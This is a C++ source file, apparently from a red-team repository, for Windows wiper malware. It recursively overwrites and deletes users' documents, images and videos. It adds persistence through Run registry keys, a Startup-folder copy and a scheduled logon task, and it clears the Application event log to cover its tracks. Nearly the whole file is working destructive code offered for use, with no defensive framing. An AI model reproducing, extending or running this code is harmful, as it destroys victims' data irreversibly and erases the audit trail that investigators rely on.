/*RED TEAM 444
  author : U0lEREhBTlQ=
  https://github.com/RED-TEAM-444/Wiper-Malware.git
*/

#include <iostream>
#include <fstream>
#include <filesystem>
#include <windows.h>
#include <thread>
#include <vector>
#include <shlobj.h>

// Function to overwrite a file with null bytes
void overwriteFile(const std::string& filepath) {
    try {
        std::ofstream file(filepath, std::ios::binary | std::ios::in);
        if (file.is_open()) {
            auto fileSize = std::filesystem::file_size(filepath);
            for (uint64_t i = 0; i < fileSize; i++) {
                file.put(0);  // Overwriting with null bytes
            }
            file.close();
        }
        std::filesystem::remove(filepath);  // Delete the file after overwriting
        std::cout << "File " << filepath << " overwritten and deleted successfully.\n";
    } catch (const std::exception& e) {
        std::cerr << "Error while overwriting file: " << e.what() << "\n";
    }
}

// Function to scan directories recursively and target specific file types
void findAndWipeFiles(const std::string& directory, const std::vector<std::string>& fileExtensions) {
    try {
        for (const auto& entry : std::filesystem::recursive_directory_iterator(directory)) {
            if (entry.is_regular_file()) {
                std::string filepath = entry.path().string();
                std::string extension = entry.path().extension().string();

                // Check if the file's extension matches the target file types
                if (std::find(fileExtensions.begin(), fileExtensions.end(), extension) != fileExtensions.end()) {
                    overwriteFile(filepath);
                }
            }
        }
    } catch (const std::exception& e) {
        std::cerr << "Error in directory scan: " << e.what() << "\n";
    }
}

// Wiper function to target specific file types in selected directories
void runWiper() {
    // Specify the target file extensions (e.g., documents, images, videos)
    std::vector<std::string> targetExtensions = { ".txt", ".docx", ".pdf", ".jpg", ".png", ".mp4" };

    // Specify the directories to scan (could be the entire user directory or specific paths)
    std::vector<std::string> targetDirectories = {
        "C:\\Users\\User\\Documents",
        "C:\\Users\\User\\Pictures",
        "C:\\Users\\User\\Videos"
        // Add more directories as needed
    };

    // Scan each directory for target file types and wipe them
    for (const auto& directory : targetDirectories) {
        findAndWipeFiles(directory, targetExtensions);
    }
}

// Function to add malware to the registry for persistence
void addRegistryKey(const std::string& exePath, HKEY rootKey, const std::string& keyName) {
    HKEY hKey;
    LONG regOpen = RegOpenKeyEx(rootKey, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);

    if (regOpen == ERROR_SUCCESS) {
        LONG regSet = RegSetValueEx(hKey, keyName.c_str(), 0, REG_SZ, (BYTE*)exePath.c_str(), exePath.length() + 1);
        if (regSet == ERROR_SUCCESS) {
            std::cout << "Persistence added successfully to " << (rootKey == HKEY_LOCAL_MACHINE ? "HKEY_LOCAL_MACHINE" : "HKEY_CURRENT_USER") << ".\n";
        }
        RegCloseKey(hKey);
    } else {
        std::cerr << "Failed to open registry key for persistence.\n";
    }
}

// Function to add malware to startup folder
void addStartupFolder(const std::string& exePath) {
    char startupPath[MAX_PATH];
    HRESULT result = SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, startupPath);

    if (result == S_OK) {
        std::string shortcutPath = std::string(startupPath) + "\\malware.lnk";
        CopyFile(exePath.c_str(), shortcutPath.c_str(), FALSE);  // Copy executable to startup folder
        std::cout << "Persistence added to startup folder.\n";
    } else {
        std::cerr << "Failed to get startup folder path.\n";
    }
}

// Function to add a scheduled task for malware persistence
void addScheduledTask(const std::string& exePath) {
    // Use schtasks command to schedule the malware to run at logon
    std::string command = "schtasks /create /tn \"MyMalware\" /tr \"" + exePath + "\" /sc onlogon /f";
    system(command.c_str());
    std::cout << "Scheduled task for persistence added.\n";
}

// Persistence function to use multiple persistence methods
void runPersistence() {
    std::string exePath = "C:\\path\\to\\malware.exe";

    // Try registry-based persistence (HKEY_CURRENT_USER and HKEY_LOCAL_MACHINE)
    addRegistryKey(exePath, HKEY_CURRENT_USER, "MyWiperMalware");
    addRegistryKey(exePath, HKEY_LOCAL_MACHINE, "MyWiperMalware");

    // Add to startup folder
    addStartupFolder(exePath);

    // Schedule a task for persistence
    addScheduledTask(exePath);
}

// Function to clear Windows event logs
void clearEventLogs() {
    HANDLE hEventLog = OpenEventLog(NULL, "Application");
    if (hEventLog) {
        BOOL result = ClearEventLog(hEventLog, NULL);
        if (result) {
            std::cout << "Application event log cleared.\n";
        } else {
            std::cerr << "Failed to clear Application event log.\n";
        }
        CloseEventLog(hEventLog);
    } else {
        std::cerr << "Failed to open Application event log.\n";
    }
}

// Cleanup function to clear event logs
void runCleanup() {
    clearEventLogs();
}

// Main function to coordinate tasks in the correct sequence
int main() {
    try {
        // Step 1: Run the enhanced file wiper in a separate thread
        std::thread wiperThread(runWiper);
        
        // Step 2: Run the enhanced persistence mechanisms
        std::thread persistenceThread(runPersistence);
        
        // Step 3: Run log cleanup (clear event logs)
        std::thread cleanupThread(runCleanup);

        // Ensure all threads complete before exiting
        wiperThread.join();
        persistenceThread.join();
        cleanupThread.join();

        std::cout << "All tasks executed successfully in sequence.\n";
    } catch (const std::exception& e) {
        std::cerr << "Error in executing malware tasks: " << e.what() << "\n";
    }

    return 0;
}
